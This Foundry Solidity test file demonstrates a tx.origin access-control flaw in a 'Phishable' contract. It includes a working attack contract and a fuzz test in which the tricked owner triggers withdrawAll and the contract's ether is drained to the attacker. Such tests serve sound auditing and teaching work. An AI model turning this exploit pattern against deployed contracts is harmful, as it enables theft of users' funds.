
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract AttackContract {
    Phishable public target;
    address payable public attacker;

    constructor(Phishable _target, address payable _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function attack() external {
        target.withdrawAll(attacker);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        phishable = new Phishable(owner);
        vm.deal(address(phishable), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner since they are the only privileged role
        vm.assume(caller != owner);
        
        // Exclude the phishable contract itself
        vm.assume(caller != address(phishable));

        // --- 2. State Configuration ---
        uint256 initialBalance = address(phishable).balance;
        uint256 callerInitialBalance = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // The vulnerability here is the use of tx.origin instead of msg.sender
        // An attacker can create a malicious contract that tricks the owner into calling it
        // When the owner calls the attacker's contract, tx.origin will be the owner
        // allowing the attacker's contract to call withdrawAll successfully
        
        // Deploy attack contract from the arbitrary caller
        vm.prank(caller);
        AttackContract attackContract = new AttackContract(phishable, payable(caller));

        // Simulate the owner being tricked into calling the attack contract
        // This demonstrates the tx.origin vulnerability - the owner thinks they're
        // interacting with a legitimate contract, but it drains the Phishable contract
        vm.prank(owner, owner); // Set both msg.sender and tx.origin to owner
        attackContract.attack();

        // Assert that the funds were stolen by the arbitrary caller
        assertEq(address(phishable).balance, 0, "Phishable contract should be drained");
        assertEq(caller.balance, callerInitialBalance + initialBalance, "Caller should receive all funds");
    }
}
